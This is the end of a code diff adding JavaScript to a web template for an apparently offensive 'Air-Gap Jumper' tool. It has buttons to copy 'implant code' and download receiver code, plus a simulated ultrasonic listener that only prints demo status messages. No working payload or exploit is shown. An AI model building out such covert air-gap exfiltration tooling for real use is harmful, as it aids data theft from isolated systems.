+    log(`Downloading ${method} receiver code...`, 'info');
+}
+
+function copyImplantCode() {
+    const code = document.getElementById('implant-code').textContent;
+    navigator.clipboard.writeText(code);
+    log('Implant code copied to clipboard', 'success');
+}
+
+function startListening() {
+    log('Starting ultrasonic receiver...', 'info');
+    const output = document.getElementById('receiver-output');
+    output.innerHTML += '<div class="text-success">[+] Microphone access requested...</div>';
+    output.innerHTML += '<div class="text-warning">[!] Listening for signals at 18-22kHz...</div>';
+    
+    // In real implementation, this would use Web Audio API
+    // For demo, just show status
+    setInterval(() => {
+        output.innerHTML += '<div class="text-secondary">[*] Scanning... (no signal detected)</div>';
+        output.scrollTop = output.scrollHeight;
+    }, 3000);
+}
+
+function stopListening() {
+    log('Receiver stopped', 'warning');
+}
+
+// Initialize
+document.addEventListener('DOMContentLoaded', function() {
+    drawWaveform(19000);
+    selectMethod('ultrasonic');
+    log('Air-Gap Jumper ready', 'success');
+});
+</script>
+{% endblock %}
